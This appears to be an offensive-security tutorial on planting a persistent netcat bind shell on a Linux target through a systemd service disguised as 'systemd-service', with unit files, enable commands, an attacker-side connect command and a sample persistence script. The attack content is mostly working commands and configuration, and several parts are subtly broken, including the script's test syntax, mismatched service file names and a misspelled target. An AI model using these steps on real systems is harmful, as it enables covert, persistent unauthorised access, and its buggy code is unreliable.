# Systemd netcat bind shell

involves creating a custom service that will also persist across reboots, but this one will be with Systemd, which has quickly become part of most Linux distributions as a replacement for the UNIX System V init system used to launch services and processes and system startup.

With a bind shell, the attacker directly connects to the bind port and is greeted with a shell.

So, in regards to the difference between the two, we’re initiating a connection to the target for a shell, rather than the target connecting back to our attacker system, as was with the xinetd backdoor.

#### The steps to create a Systemd Netcat Bind Shell are as follows:

Step 1. On the target system, we’re again going to copy the /bin/nc executable, but this time to the /lib/systemd directory, and we’ll call it “systemd-service”:

```
cp /bin/nc /lib/systemd/systemd-service
```

Step 2. Still, on the target, we’re going to create a file called /lib/systemd/system/systemd.service with the following contents:

```
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
[Install]
WantedBy = multi-user.target
```

or this one with freeBSD version of netcat:

```
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = mkfifo foo && nc -lk 2600 0<foo | /bin/bash 1>foo
[Install]
WantedBy = multi-user.target
```

The above systemd service configuration file will create bind shell on port 56825 TCP.

Step 3. Enable our new Systemd Netcat Bind Shell service, and start our Systemd Netcat Bind Shell Service:

```
systemctl enable systemd.service
systemctl start systemd.service
```

Confirm that our port for our custom service is listening on the target:

```
netstat –auntp |grep 56825
```

Step 5. From our attacker machine, we should now be able to connect to port 56825 using netcat and get a shell:

```
nc <target_IP> 56825
```

This service will persist on reboots and will be listed as “systemd-service” if listing processes.

## Sample Script

```
#!/bin/bash

if [ $1 -z ]
        then
                echo "NOTE file should be in home directory"
                echo "./rc_local_persistence.sh  <filename> "
                exit 1
fi

HOME= $HOME

echo "[+] Creating service file for c.local.service ..."

echo "[+] Checking for .local.service in systemd..."
echo "[+] Creating .local.service file."
sudo touch /etc/systemd/system/$1.service 
printf "[Unit]\n Description=$1 Compatibility\n\n[Service]\n ExecStart=$HOME/$1\n TimeoutSec=0\n RemainAfterExit=yes\n Restart=always\n\n[Install]\n WantedBy=multi.user.target\n" | sudo tee /etc/systemd/system/c.sh.service

echo "[+] Enabling the service in systemctl..."
sudo systemctl enable $1.service
sleep 0.2

echo "[+] Running the service..."
sudo systemctl start $1

sudo systemctl status $1
```
